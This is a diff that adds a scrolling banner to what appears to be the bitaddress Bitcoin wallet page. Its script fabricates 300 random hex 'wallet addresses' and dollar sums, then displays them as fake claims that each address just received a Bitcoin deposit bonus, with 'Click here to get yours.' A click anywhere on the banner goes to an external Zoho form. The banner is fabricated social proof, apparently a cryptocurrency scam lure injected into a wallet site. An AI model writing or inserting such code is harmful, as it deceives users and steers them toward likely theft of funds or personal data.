@@ -86,5 +86,107 @@
             Something exciting is loading. Stay tuned!<br>May 19.
         </p>
     </div>
+
+<!-- Chyron HTML -->
+<div id="chyron" onclick="window.location.href='https://forms.zohopublic.com/bitaddress1/form/bitAddressDepositBonusForm/formperma/F-Y6NKaMygDIpaRYyx9bgRmh5hphF9WokO52RfIUY2A';">
+  <div id="chyron-text"></div>
+</div>
+
+<!-- Chyron CSS -->
+<style>
+  /* Reset default margins and ensure full width */
+  html, body {
+    margin: 0;
+    padding: 0;
+    width: 100%;
+    overflow-x: hidden; /* Prevent horizontal scrollbar */
+  }
+
+  #chyron {
+    position: fixed;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    width: 100%; /* Full width */
+    min-width: 100%; /* Ensure no shrinkage */
+    max-width: none; /* Prevent max-width constraints */
+    background-color: green;
+    color: yellow;
+    font-weight: bold;
+    font-size: 18px;
+    height: 40px;
+    overflow: hidden;
+    display: flex;
+    align-items: center;
+    cursor: pointer;
+    z-index: 9999;
+    touch-action: none; /* Prevent touch scrolling */
+    user-select: none; /* Prevent text selection */
+    box-sizing: border-box; /* Include padding/borders in width */
+  }
+
+  #chyron-text {
+    white-space: nowrap;
+    display: inline-block;
+    animation: scroll-left 2500s linear infinite; /* Slower animation */
+    padding-left: 100%;
+  }
+
+  @keyframes scroll-left {
+    0% {
+      transform: translateX(0%);
+    }
+    100% {
+      transform: translateX(-100%);
+    }
+  }
+
+  /* Adjust font size for smaller screens */
+  @media screen and (max-width: 600px) {
+    #chyron {
+      font-size: 16px;
+    }
+  }
+
+  /* Ensure compatibility with Chrome's desktop site mode */
+  @media screen and (min-width: 601px) {
+    #chyron {
+      width: 100vw; /* Fallback for desktop mode */
+    }
+  }
+</style>
+
+<!-- Chyron JavaScript -->
+<script>
+// Function to generate random Bitcoin wallet addresses
+function generateWalletAddresses(count) {
+  const wallets = [];
+  const characters = '0123456789abcdef';
+  const legacyPrefixes = ['1', '3'];
+  const segwitPrefix = 'bc1q';
+
+  for (let i = 0; i < count; i++) {
+    let address;
+    if (Math.random() < 0.5) {
+      address = segwitPrefix + Array(39).fill().map(() => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
+    } else {
+      const prefix = legacyPrefixes[Math.floor(Math.random() * legacyPrefixes.length)];
+      address = prefix + Array(33).fill().map(() => characters.charAt(Math.floor(Math.random() * characters.length))).join('');
+    }
+    const amount = (Math.random() * 9999.99).toFixed(2);
+    wallets.push({ address, amount: `$${amount}` });
+  }
+  return wallets;
+}
+
+// Generate 300 wallet addresses
+const wallets = generateWalletAddresses(300);
+
+// Create chyron messages
+const messages = wallets.map(w => `${w.address} has just received ${w.amount} worth of Bitcoin as deposit bonus. Click here to get yours.`);
+
+// Join messages with a separator
+document.getElementById("chyron-text").textContent = messages.join("     •     ");
+</script>
 </body>
 </html>
